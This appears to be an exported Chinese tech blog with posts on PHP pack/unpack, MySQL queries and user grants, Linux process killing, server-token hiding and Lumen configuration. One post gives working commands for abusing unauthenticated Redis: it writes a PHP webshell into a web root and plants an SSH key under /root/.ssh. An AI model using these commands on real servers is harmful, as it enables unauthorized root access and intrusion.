$bin是返回的二进制字符，你可以直接输出它，PHP知道如何处理。通过bin2hex方法将$bin转换成十六进制可以知道，十六进制0x64表示的是字符d。对于中文字符(多字节字符)来说，通常有GBK编码、BIG5编码以及UTF8编码等。比如在GBK编码中，一个中文字符采用2个字节来表示；在UTF8编码中，一个中文字符采用3个字节来表示。这通常需要协商采用统一的编码，否则会由于内部的表示不一致导致无法处理。在PHP中只要将文件保存为特定的编码格即可，其它语言可能跟操作系统相关，因此或许需要编码转换。本文的例子一概基于UTF8编码。 继续来看个例子： 12345&lt;?php$bin = pack("a3", "中");echo "output: 0x" . bin2hex($bin) . "\n";echo "output: " . chr(0xe4) . chr(0xb8) . chr(0xad) . "\n";echo "output: " . $bin&#123;0&#125; . $bin&#123;1&#125; . $bin&#123;2&#125; . "\n"; 1234$ php -f pack.phpoutput: 0xe4b8adoutput: 中output: 中 你可能会觉得很奇怪，后面2个输出是一样的。ASCII码表示单字节字符(其中包括英文字母、数字、英文标点符号、不可见字符以及控制字符等等)，它总是小于0x80，即小于十进制的128。当在处理字符时，如果字节小于0x80，则把它当作单字节来处理，否则会继续读取下一个字节，这通常跟编码有关，GBK会将2个字节当成一个字符来处理，UTF8则需要3个字节。有时候在PHP中需要做类似的处理，比如计算字符串中字符的个数(字符串可能包含单字节和多字节)，strlen方法只能计算字节数，而mb_strlen需要开启扩展。类似这样的需求，其实很容易处理： 1234567891011121314151617&lt;?phpfunction mbstrlen($str) &#123; $len = strlen($str); if ($len &lt;= 0) &#123; return 0; &#125; $count = 0; for ($i = 0; $i &lt; $len; $i++) &#123; $count++; if (ord($str&#123;$i&#125;) &gt;= 0x80) &#123; $i+= 2; &#125; &#125; return $count;&#125;echo "output: " . mbstrlen("中国so强大！") . "\n"; 12$ php -f pack.phpoutput: 7 以上代码的实现就是利用单字节字符的ASCII码小于0x80。至于要跳过几个字节，这要看具体是什么编码。接下来通过例子来看看a和A的区别： main.go的源码(只是用于测试，没有考虑细节)： 1234567891011121314151617181920212223242526272829303132package mainimport ( "fmt" "net")const BUF_SIZE = 20func handleConnection(conn net.Conn) &#123; defer conn.Close() buf := make([]byte, BUF_SIZE) n, err := conn.Read(buf) if err != nil &#123; fmt.Printf("err: %v\n", err) return &#125; fmt.Printf("\n已接收：%d个字节，数据是：'%s'\n", n, string(buf))&#125;func main() &#123; ln, err := net.Listen("tcp", ":9872") if err != nil &#123; fmt.Printf("error: %v\n", err) return &#125; for &#123; conn, err := ln.Accept() if err != nil &#123; continue &#125; go handleConnection(conn) &#125;&#125; 编译运行 123\$ cd $GOPATH/src/pack/_test\$ go build\$ ./pack/_test 代码很简单，收到数据，然后输出。 pack.php 12345678910111213&lt;?php$host = "127.0.0.1";$port = "9872";$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die("Unable to create socket\n");@socket_connect($socket, $host, $port) or die("Connect error.\n");if ($err = socket_last_error($socket)) &#123; socket_close($socket); die(socket_strerror($err) . "\n");&#125;$binarydata = pack("a20", "中国强大");$len = socket_write($socket, $binarydata, strlen($binarydata));socket_close($socket); 12$ php -f pack.phpoutput: 已接收：20个字节，数据是：&apos;中国强大&apos; 以上的输出中，单引号不是数据的一部分，只是为了便于观察。很明显，我们打包的字符串只占12字节， a20 表示 20 个 a，你当然可以连续写 20 个a，但我想你不会这么傻。如果是 a- 的话，则表示任意多个a。通过服务器端的输出来看，PHP发送了20个字节过去，服务器端也接收了20个字节，但因为填充的 \0 是空字符，所以你不会看到有什么不一样的地方。现在我们将 a20 换成 A20 ，代码如下： 12345678910111213&lt;?php$host = "127.0.0.1";$port = "9872";$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die("Unable to create socket\n");@socket_connect($socket, $host, $port) or die("Connect error.\n");if ($err = socket_last_error($socket)) &#123; socket_close($socket); die(socket_strerror($err) . "\n");&#125;$binarydata = pack("A20", "中国强大");$len = socket_write($socket, $binarydata, strlen($binarydata));socket_close($socket); 12$ php -f pack.phpoutput: 已接收：20个字节，数据是：&apos;中国强大 &apos; 是的，空格存在于数据中。这就是a和A的区别。 h和H的描述看起来有些奇怪。它们都是读取十进制，以十六进制方式读取，以半字节(4位)为单位。这听起来有些拗口，还是以实例来说明： 12&lt;?phpecho "output: " . pack("H", 0x5) . "\n"; 12$ php -f pack.phpoutput: P 首先是读取十进制，所以0x5会转成十进制的5，然后以半字节为单位并且以十六进制方式读取，为了补足8位，所以需要在5后面补0，变成0x50。别忘了十六进制的一位相当于二进制的四位。0x50正好是字符P的ASCII码。 12&lt;?phpecho "output: " . chr(0x50) . "\n"; 12$ php -f pack.phpoutput: P h和H的差别在于h是低位在前，H是高位在前，拿前面的例子来看看h的行为： 1234&lt;?php$bin = pack("h", 0x5);echo "output: " . $bin . "\n";echo "output: " . ord($bin) . "\n"; 123$ php -f pack.phpoutput:output: 5 读取十进制的5，后面补0，变成十六进制的0x50，因为H是高位在前，所以没有变化，而h就需要将0x50变成0x05。由于0x05是不可见字符，所以上面的字符输出是空的。 h和H是以半字节为单位，h2和H2则表示一次读取8位，同理h3和H3可以推导出来，但是别忘了补足8位. 12&lt;?phpecho "output: " . pack("H", 0x47) . "\n"; 12$ php -f pack.phpoutput: p 以上的代码中，0x47为十进制的71，因为读取半个字节，所以变成0x7，后面补0变成0x70，则刚好是字符p的ASCII码。如果换成是h格式化，则最终的结果是0x07，因为低位在前。 对于一次读取多个字节，也以同样的规则： 12&lt;?phpecho "output: " . pack("H2h2", 0x47, 0x56) . "\n"; 12$ php -f pack.phpoutput: qh 0x47是十进制的71，由于使用H2格式化，所以一次读取8位，最后变成十六进制的0x71，即字符q的ASCII码。0x56是十进制的86，由于使用h2格式化，所以一次读取8位，最后变成十六进制的0x86，但是由于h表示低位在前，因此0x86变成0x68，即字符h的ASCII码。 c和C都表示字符，前者表示有符号字符，后者表示无符号字符。 1234567&lt;?phpecho "output: " . pack("c", 65) . "\n";echo "output: " . pack("C", 65) . "\n";```s$ php -f pack.phpoutput: Aoutput: A s为有符号短整数；S为无符号短整数。它们都为主机字节序，并且为16位。通常为主机字节序的格式化字符，一般只用于单机的操作，因为你无法确定主机字节序究竟是大端还是小端。当然，你一定要这么干的话，也是有办法来获取本机字节序是属于大端或小端，但那样是没有必要的。稍后就会给出一个通过PHP来判断字节序的例子。 12345&lt;?php$bin1 = pack("s", 345);$bin2 = pack("S", 452);print_r(unpack("sshort1", $bin1));print_r(unpack("sshort2", $bin2)); 1234567$ php -f pack.phpArray( [short1] =&gt; 345)Array( [short2] =&gt; 452) n和v除了明确指定了字节序，其它行为跟s和S是一样的。 i和I依赖于机器大小及字节序，很少用它们。 l、L、N、V跟s、S、n、v类似，除了表示的大小不同，前者都为32位，后者都为16位。 f、d是因为float和double与CPU无关。一般来说，编译器是按照IEEE标准解释的，即把float/double看作4/8个字符的数组进行解释。因此，只要编译器是支持IEEE浮点标准的，就不需要考虑字节顺序。 剩下的x、X和@用得比较少，对此不作深究。 unpack的用法unpack是用来解包经过pack打包的数据包，如果成功，则返回数组。其中格式化字符和执行pack时一一对应，但是需要额外的指定一个key，用作返回数组的key。多个字段用/分隔。例如： 123456&lt;?php$bin = @pack("a9SS", "Subscriptions", 20, 1);$data = @unpack("a9name/sage/Sgender", $bin);if (is_array($data))&#123; print_r($data);&#125; 123456$ php -f pack.phpArray( [name] =&gt; Subscriptions [age] =&gt; 20 [gender] =&gt; 1) 一些例子 判断大小端 1234567891011121314function IsBigEndian() &#123; $bin = pack("L", 0x12345678); $hex = bin2hex($bin); if (ord(pack("H2", $hex)) === 0x78) &#123; return FALSE; &#125; return TRUE;&#125;if (IsBigEndian()) &#123; echo "大端序";&#125; else &#123; echo "小端序";&#125;echo "\n"; 网络通信 比如现在要通过PHP发送数据包到服务器来登录。在仅需要提供用户名(最多30个字节)和密码(md5之后固定为32字节)的情况下，可以构造如下数据包(当然这事先需要跟服务器协商好数据包的规范，本例以网络字节序通信)： 包结构： 字段 字节数 说明 包头 定长 每一个通信消息必须包含的内容 包体 不定长 根据每个通信消息的不同产生变化 其中包头详细内容如下： 字段 字节数 类型 说明 pkg_len 2 ushort 整个包的长度，不超过4K version 1 uchar 通讯协议版本号 command_id 2 ushort 消息命令ID result 2 short 请求时不起作用；请求返回时使用&lt; 当然实际中可能会涉及到各种校验。本文为了简单，只是列举一下通常的工作流程及处理的方式。 登录(执行命储1001) 字段 字节数 类型 说明 用户名 30 uchar[30] 登录用户名 密码 32 uchar[32] 登录密码 包头是定长的，通过计算可知包头占7个字节，并且包头在包体之前。比如用户Subscriptions需要登录，密码是123456，则代码如下： 1234567891011$version = 1;$result = 0;$command_id = 1001;$username = "Subscriptions";$password = md5("123456"); // 构造包体$bin_body = pack("a30a32", $username, $password);// 包体长度$body_len = strlen($bin_body);$bin_head = pack("nCns", $body_len, $version, $command_id, $result);$bin_data = $bin_head . $bin_body;// 发送数据socket_write($socket, $bin_data, strlen($bin_data));socket_close($socket); 服务器端通过读取定长包头，拿到包体长度，再读取并解析包体。大致的过程就是这样。当然服务器端也会返回响应包，客户端做相应的读取处理。]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[初识Redis未授权访问]]></title>
    <url>%2Farticles%2F%E5%88%9D%E8%AF%86Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
    <content type="text"><![CDATA[redis是一种以key-value为键值对的非关系型数据库 redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Map), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞利用本机通过telnet命令主动去连接目标机 telnet 192.168.1.13 6379 或者通过 redis-cli.exe -h 192.168.1.13 连接 连接成功后，输入info获取相关信息可以看到redis版本号等 利用方式写入一句话webshell123456789//设置x的值redis 192.168.1.13:6379&gt; set x &quot;&lt;?php phpinfo(); ?&gt;&quot;redis 192.168.1.13:6379&gt; config set dbfilename test.phpredis 192.168.1.13:6379&gt; config set dir D:/WWW/redis 192.168.1.13:6379&gt; save 成功写入目标机 http://192.168.1.13/test.php 写入ssh公钥 在本地生成一对密钥 1root@ip-172-31-14-115:~/.ssh# ssh-keygen -t rsa 接着将ssh公钥写入靶机 123456789root@ip-172-31-14-115:/etc/redis# redis-cli -h 192.168.1.13192.168.1.13:6379&gt; config set dir /root/.ssh # 设置本地存储文件目录192.168.1.13:6379&gt; config set dbfilename pub_keys # 设置本地存储文件192.168.1.13:6379&gt; set x &quot;xxxx&quot; # 将你的ssh公钥写入x键里。(xxxx即你自己生成的ssh公钥)192.168.1.13:6379&gt; save # 保存 再到本地去连接ssh 1root@ip-:~/.ssh# ssh -i id_rsa root@192.168.1.13 即可]]></content>
      <categories>
        <category>安全研究</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql 查询重复数据]]></title>
    <url>%2Farticles%2Fmysql%20%E6%9F%A5%E8%AF%A2%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[本文主要介绍关于MySQL中查询、删除重复记录的方法，下面是详细的介绍： 查找所有重复标题的记录 123select title,count(*) as count from user_table group by title having count&gt;1;SELECT * FROM t_info a WHERE ((SELECT COUNT(*) FROM t_info WHERE Title = a.Title) &gt; 1) ORDER BY Title DESC 查找全部重复记录 1SELECT * FROM t_info a WHERE ((SELECT COUNT(*) FROM t_info WHERE Title = a.Title) &gt; 1) ORDER BY Title DESC 过滤重复记录(只显示一条) 1Select * From HZT Where ID In (Select Max(ID) From HZT Group By Title) 注：此处显示ID最大一条记录 删除全部重复记录（慎用） 1Delete 表 Where 重复字段 In (Select 重复字段 From 表 Group By 重复字段 Having Count(*)&gt;1) 保留一条 1Delete HZT Where ID Not In (Select Max(ID) From HZT Group By Title) 注：此处保留ID最大一条记录 ###举例 1、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断 1select * from people where peopleId in (select peopleId from people group by peopleId having count(peopleId) &gt; 1) 2、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录 1delete from people where peopleId in (select peopleId from people group by peopleId having count(peopleId) &gt; 1) and rowid not in (select min(rowid) from people group by peopleId having count(peopleId )&gt;1) 3、查找表中多余的重复记录（多个字段） 1select * from vitae a where (a.peopleId,a.seq) in (select peopleId,seq from vitae group by peopleId,seq having count(*) &gt; 1) 4、删除表中多余的重复记录（多个字段），只留有rowid最小的记录 1delete from vitae a where (a.peopleId,a.seq) in (select peopleId,seq from vitae group by peopleId,seq having count(*) &gt; 1) and rowid not in (select min(rowid) from vitae group by peopleId,seq having count(*)&gt;1) 5、查找表中多余的重复记录（多个字段），不包含rowid最小的记录 1select * from vitae a where (a.peopleId,a.seq) in (select peopleId,seq from vitae group by peopleId,seq having count(*) &gt; 1) and rowid not in (select min(rowid) from vitae group by peopleId,seq having count(*)&gt;1) 补充 有两个以上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。 1、对于第一种重复，比较容易解决，使用 1select distinct * from tableName 就可以得到无重复记录的结果集。 如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除 1234select distinct * into #Tmp from tableNamedrop table tableNameselect * into tableName from #Tmpdrop table #Tmp 发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。 2、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下 假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集 123select identity(int,1,1) as autoID, * into #Tmp from tableNameselect min(autoID) as autoID into #Tmp2 from #Tmp group by Name,autoIDselect * from #Tmp where autoID in(select autoID from #tmp2)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux下批量杀掉筛选进程]]></title>
    <url>%2Farticles%2FLinux%E4%B8%8B%E6%89%B9%E9%87%8F%E6%9D%80%E6%8E%89%E7%AD%9B%E9%80%89%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[由于情况要求，需要只杀掉某一类含有特定参数命令的进程。 具体命令参考： 1ps -ef | grep test | grep -v grep | awk '&#123;print $2&#125;' | xargs kill -9 其中： | 管道符，用来隔开两个命令，管道符左边命令的输出会作为管道符右边命令的输入。 ps 命令用来列出系统中当前运行的进程， ps -ef显示所有进程信息，联通命令行。 grep 命令用于过滤/搜索特定字符，grep test在这里为搜索过滤所有含有‘test’名称的进程 grep -v grep 显示不包含匹配文本的所有行，在这里为筛选出所有不包含grep名称的进程，对上一步的进程再做一次筛选(因为ps -ef列出了所有的命令，包括命令行) awk 在文件或字符串中基于指定规则浏览和抽取信息；把文件逐行读入，以空格为默认分隔符将每行切片，然后再进行后序处理。这里利用awk ‘{print $2}’将上一步中过滤得到的进程进行打印，$2表示打印第二个域(PID，进程号) $0表示所有域,$1表示第一个域，$n表示第n个域。 xargs 命令是给命令传递参数的过滤器，善于把标准数据数据转换成命令行参数。在这里则是将获取前一个命令的标准输出然后转换成命令行参数传递给后面的kill命令。 kill -9 强制关闭进程。 此外，也有使用cut命令进行处理的，参考如下： 1ps -ef | grep test | grep -v grep | cut -c 9-15 | xargs kill -9 cut -c 9-15 仅显示第9-15个字符(即PID，进程号)]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[phpexcel导出excel无法打开，提示文件格式或文件名无效，文件损毁，解决办法]]></title>
    <url>%2Farticles%2Fphpexcel%E5%AF%BC%E5%87%BAexcel%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80-%E6%8F%90%E7%A4%BA%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%88%96%E6%96%87%E4%BB%B6%E5%90%8D%E6%97%A0%E6%95%88-%E6%96%87%E4%BB%B6%E6%8D%9F%E6%AF%81-%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
    <content type="text"><![CDATA[xls还是xlsx？首先确定导出的excel文件扩展名,然后添加header，不同的文件类型，不同的header。我就是这里出了问题，xlsx用了xls的header，导致导出的excel无法打开。 xlsx如下： 12345678910111213$excelName = '绩效得分统计'.time();header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');header('Content-Disposition: attachment;filename="'.$excelName.'.xlsx"');header('Cache-Control: max-age=0');$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');$objWriter-&gt;save('php://output');exit; xls如下： 1234567891011header('Content-Type: application/vnd.ms-excel');header('Content-Disposition: attachment;filename="links_out'.$timestamp.'.xls"');header('Cache-Control: max-age=0');$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');$objWriter-&gt;save('php://output');exit; 末尾添加exit。 123$objWriter-&gt;save('php://output');exit;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[重启nginx后丢失nginx.pid的解决方法]]></title>
    <url>%2Farticles%2F%E9%87%8D%E5%90%AFnginx%E5%90%8E%E4%B8%A2%E5%A4%B1nginx-pid%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1nginx -c /etc/nginx/nginx.conf]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[隐藏服务器token]]></title>
    <url>%2Farticles%2F%E9%9A%90%E8%97%8F%E6%9C%8D%E5%8A%A1%E5%99%A8token%2F</url>
    <content type="text"><![CDATA[1、Php 关键词: expose_php = off 2、Nginx nginx.conf : 关键词: server_tokens off 3、Apache ServerSignature 这允许在服务器生成的文档（如错误消息、modproxy 的 ftp 目录列表、modinfo 输出等等）下添加一个显示服务器名称和版本号的页脚行。 它有三个可能的值： On - 允许在服务器生成的文档中添加尾部页脚行 Off - 禁用页脚行 EMail - 创建一个 “mailto:” 引用；用于将邮件发送到所引用文档的 ServerAdmin。 ServerTokens 它决定了发送回客户端的服务器响应头字段是否包含服务器操作系统类型的描述和有关已启用的 Apache 模块的信息。 此指令具有以下可能的值（以及在设置特定值时发送到客户端的示例信息）： 1234567891011121314151617181920212223ServerTokens Full (或者不指定)发送给客户端的信息： Server: Apache/2.4.2 (Unix) PHP/4.2.2 MyMod/1.2ServerTokens Prod[uctOnly]发送给客户端的信息： Server: ApacheServerTokens Major发送给客户端的信息： Server: Apache/2ServerTokens Minor发送给客户端的信息： Server: Apache/2.4ServerTokens Min[imal]发送给客户端的信息：Server: Apache/2.4.2ServerTokens OS发送给客户端的信息： Server: Apache/2.4.2 (Unix) 注意：在 Apache 2.0.44 之后，ServerTokens 也控制由 ServerSignature 指令提供的信息。 为了隐藏 web 服务器版本号、服务器操作系统细节、已安装的 Apache 模块等等，使用你最喜欢的编辑器打开 Apache 配置文件： 123$ sudo vi /etc/apache2/apache2.conf #Debian/Ubuntu systems$ sudo vi /etc/httpd/conf/httpd.conf #RHEL/CentOS systems 添加/修改/附加下面的行： 1ServerTokens ProdServerSignature Off 保存并退出文件，重启你的 Apache 服务器]]></content>
      <categories>
        <category>服务器运维</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SVG to PNG]]></title>
    <url>%2Farticles%2FSVG%20to%20PNG%2F</url>
    <content type="text"><![CDATA[Installation $ composer require meyfa/php-svg Getting Started 1234567891011121314151617require '../vendor/autoload.php';use SVG\SVGImage;use SVG\Nodes\Shapes\SVGRect;$svg = file_get_contents("d:/1.svg");$svg = str_replace('fill="#2c2c2c"','fill="#e21010"',$svg);$image = SVGImage::fromString($svg);$rasterImage = $image-&gt;toRasterImage(200, 200);header('Content-Type: image/png');imagepng($rasterImage,'d:/1.png');]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于Lumen(Laravel)中.env文件中的环境变量是如何生效的]]></title>
    <url>%2Farticles%2F%E5%85%B3%E4%BA%8ELumen-Laravel-%E4%B8%AD-env%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%98%AF%E5%A6%82%E4%BD%95%E7%94%9F%E6%95%88%E7%9A%84%2F</url>
    <content type="text"><![CDATA[.env 文件可自定义其他任何有效的环境变量，并可通过 调用 env() 或 $_SERVER 或 $_ENV 来获取该变量。那么env()是如何加载到这些变量的呢？ 函数env()：在Lumen的vendor/laravel/lumen-framework/src/helpers.php中，我们可以发现env函数是这样被定义的： 可见，env函数中调用了 getenv() 来读取环境变量。 vlucas/phpdotenv：我们知道getenv()是PHP原生提供可读取 $_SERVER 或 $_ENV 全局变量的函数API，.env文件中的环境变量为何可以通过getenv()来获取呢？vlucas/phpdotenv就是这个幕后功臣，在Lumen 或 Laravel 的vendor下可以找到她，如果要单独下载她，去这里。在vlucas/phpdotenv/src/Loader.php文件中，我们可以看到.env被加载进一个数组，然后把每一行看作setter并调用setEnvironmentVariable()方法： Loader::setEnvironmentVariable($name, $value = null) 的定义如下： PHP dotenv 是什么： Loads environment variables from .env to getenv(), $_ENV and $_SERVER automagically.This is a PHP version of the original Ruby dotenv. Why .env： You should never store sensitive credentials in your code. Storing configuration in the environment is one of the tenets of a twelve-factor app. Anything that is likely to change between deployment environments – such as database credentials or credentials for 3rd party services – should be extracted from the code into environment variables.Basically, a .env file is an easy way to load custom configuration variables that your application needs without having to modify .htaccess files or Apache/nginx virtual hosts. This means you won’t have to edit any files outside the project, and all the environment variables are always set no matter how you run your project - Apache, Nginx, CLI, and even PHP 5.4’s built-in webserver. It’s WAY easier than all the other ways you know of to set environment variables, and you’re going to love it.. NO editing virtual hosts in Apache or Nginx. NO adding php_value flags to .htaccess files. EASY portability and sharing of required ENV values. COMPATIBLE with PHP’s built-in web server and CLI runner]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mysql创建新用户方法]]></title>
    <url>%2Farticles%2FMysql%E5%88%9B%E5%BB%BA%E6%96%B0%E7%94%A8%E6%88%B7%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[创建新用户语法： 1CREATE USER 'username'@'host' IDENTIFIED BY 'password'; 例子: 123456789CREATE USER 'dog'@'localhost' IDENTIFIED BY '123456';CREATE USER 'cat'@'192.168.1.101_' IDENDIFIED BY '123456';CREATE USER 'cat'@'%' IDENTIFIED BY '123456';CREATE USER 'cat'@'%' IDENTIFIED BY '';CREATE USER 'cat'@'%'; 实例1： 1mysql&gt; create user ms ; 这样创建的用户，可以从任意安装了mysql客户端，并能够访问目标服务器的机器上创建连接，无须密码.例如，从ip:10.0.0.99的客户端执行连接： 1mysql -ums -h 172.16.1.110 查看该用户： 1mysql&gt; select user,host,password from user where user='ms '; 1SELECT USER(); //显示当前用户 实例2： 1mysql&gt; create user ms _ps identified by 'ms '; 用户连接时，必须指定密码，那就可以在创建用户时，通过指定identified by子句来设定密码 用密码登陆： 1mysql -ums _ps -p -h 172.16.1.110 如果希望指定的用户只能从某台指定的域(domain)或主机访问，可以在创建用户时指定host，例如，指定用户只能从10.0.0.99访问 1mysql&gt; create user ms _ip@10.0.0.99 identified by password '123456'; 用户访问授权语法： 1grant 权限1,权限2,...权限n on 数据库名称.表名称 to 用户名@用户地址 identified by '连接口令'; 权限1,权限2,…权限n代表 1select,insert,update,delete,create,drop,index,alter,grant,references,reload,shutdown,process,file等14个权限 实例： 1mysql&gt; grant select,insert,update,delete,create,drop on vtdc.employee to joe@10.163.225.87 identified by '123'; 给来自10.163.225.87的用户joe分配可对数据库vtdc的employee表进行select,insert,update,delete,create,drop等操作的权限，并设定口令为123。 1mysql&gt; grant all privileges on vtdc.* to joe@10.163.225.87 identified by '123'; 给来自10.163.225.87的用户joe分配可对数据库vtdc所有表进行所有操作的权限，并设定口令为123。 1mysql&gt; grant all privileges on *.* to joe@10.163.225.87 identified by '123'; 给来自10.163.225.87的用户joe分配可对所有数据库的所有表进行所有操作的权限，并设定口令为123。 1mysql&gt; grant all privileges on *.* to joe@localhost identified by '123'; 给本机用户joe分配可对所有数据库的所有表进行所有操作的权限，并设定口令为123。 直接向mysql.user表插入记录123mysql&gt; insert into user (host,user,password) values ('%','ms _insert',password('ms '));mysql&gt; flush privileges; //刷新系统权限表 修改mysql用户密码方式 使用mysqladmin语法： 1mysqladmin -u用户名 -p旧密码 password 新密码 例如： 1mysqladmin -u root -p 123 password 456； 直接修改user表的用户口令： 语法： 1update mysql.user set password=password('新密码') where User="root" and Host="localhost"; 实例： 123update user set password=password('123456') where user='root'flush privileges; 使用SET PASSWORD语句修改密码：语法： 1SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword'); 如果是当前登陆用户用SET PASSWORD = PASSWORD(“newpassword”); 实例： 12345set password for root@localhost=password('');SET PASSWORD FOR name=PASSWORD('new password');SET PASSWORD FOR 'cat'@'%' = PASSWORD("123456"); 删除用户和撤销权限 取消一个账户和其权限 12345Drop USER user;drop user username@'%'drop user username@localhost 取消授权用户: 语法： 1REVOKE privilege ON databasename.tablename FROM 'username'@'host'; 例子: 123456789REVOKE SELECT ON *.* FROM 'cat'@'%';REVOKE SELECT ON test.user FROM 'cat'@'%';revoke all on *.* from sss@localhost ;revoke all on user.* from 'admin'@'%';SHOW GRANTS FOR 'cat'@'%'; //查看授权 删除用户： 语法: 1Delete from user where user = "user_name" and host = "host_name" ; 例子： 1delete from user where user='sss' and host='localhost'; 数据库表 查看所有数据库： 数据库目录：/usr/local/mysql/data 12345678910111213mysql&gt; SHOW DATABASES; //显示数据库mysql&gt; USE abccs //进入数据库mysql&gt; SHOW TABLES; //显示表mysql&gt; DESCRIBE mytable; //显示表结构mysql&gt; CREATE DATABASE abccs; //创建一个数据库mysql&gt; CREATE TABLE mytable (name VARCHAR(20), sex CHAR(1), birth DATE, birthaddr VARCHAR(20)); //创建表mysql&gt; insert into mytable values (‘abccs’,‘f’,‘1977-07-07’,‘china’); //插入表数据 使用文本方式插入数据： mysql.txt内容： 123456abccs f 1977-07-07 chinamary f 1978-12-12 usatom m 1970-09-02 usa 执行sql 1mysql&gt; LOAD DATA LOCAL INFILE "mytable.txt" INTO TABLE pet; //导入TXT文件数据 2.删除数据库： 12345678910111213mysql&gt; drop database drop_database; //删除一个已经确定存在的数据库alter table 表名 ENGINE=存储引擎名； //修改表的存储引擎alter table 表名 drop 属性名； //删除字段alter table 旧表名 rename to 新表名； //修改表名alter table 表名 modify 属性名 数据类型； //修改字段数据类型alter table 表名 change 旧属性名 新属性名 新数据类型； //修改字段名alter table 表名 drop FOREING KEY 外键别名； //删除子表外键约束 增加表字段： 1234567891011alter table example add phone VACGAR(20); //增加无约束的字段alter table example add age INT(4) NOT NULL; //增加万增约束的字段alter table example add num INT(8) PRIMARY KEY FIRST; //表的第一个位置增加字段alter table example add address VARCHAR(30) NOT NULL AFTER phone; //表的指定位置之后增加字段alter table example modify name VARCHAR(20) FIRST; //把字段修改到第一位alter table example modify num INT(8) ATER phone；//把字段修改到指定字段之后]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[bash：scrapy：command not found]]></title>
    <url>%2Farticles%2Fbash-%20scrapy-%20command%20not%20found%2F</url>
    <content type="text"><![CDATA[一、场景 执行 pip install scrapy 后，安装成功且执行 import scrapy 成功 二、问题 在shell中执行 scrapy 返回 bash: scrapy: command not found 三、解决办法 （1）进入 Python 的主目录，如cd /usr/local/python3.6/bin，查找 scrapy 项 （2）检查 cd /usr/bin/ | ll | grep scrapy，查看是否存在 （3）不存在则执行 ln -s /usr/local/bin/scrapy /usr/bin/scrapy （4）回到shell，执行 scrapy version，成功]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[mysql常见时间格式]]></title>
    <url>%2Farticles%2Fmysql%E5%B8%B8%E8%A7%81%E6%97%B6%E9%97%B4%E6%A0%BC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[DATE 范围 ‘1000-01-01’ to ‘9999-12-31’ DATETIME 范围 ‘1000-01-01 00:00:00’ to ‘9999-12-31 23:59:59’ TIMESTAMP 范围 ‘1970-01-01 00:00:01’ UTC to ‘2038-01-19 03:14:07’ UTC 注： 如果当前时间字段不做查询， 可以直接存储为字符串。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[解决U盘启动“Failed to load ldlinux.c32”]]></title>
    <url>%2Farticles%2F%E8%A7%A3%E5%86%B3%20U%E7%9B%98%E5%90%AF%E5%8A%A8-Failed%20to%20load%20ldlinux-c32-%2F</url>
    <content type="text"><![CDATA[利用UltraISO制作了Fedora 23的U盘启动，开机F12键USB启动时出现 Failed to load ldlinux.c32 Boot failed: please change disks and press a key to continue 在网上查询很多，进行了多次尝试： 换一个其他软件制作U盘启动，尝试失败 认为下载系统软件有问题，下载了其他版本的Fedora 21/25，顺利安装 猜测是不是制作启动时写入方式有问题，尝试了多个写入方式（USB-HDD、USB-HDD+、USB-ZIP），均失败 最后选择写入方式“RAW”，Success，问题解决，安装系统时可以顺利启动。 因此，最后解决办法是： UltraISO制作启动盘时，换写入方式为“RAW”，即可解决]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux(kail)开启ssh端口服务]]></title>
    <url>%2Farticles%2Flinux-kail-%E5%BC%80%E5%90%AFssh%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%2F</url>
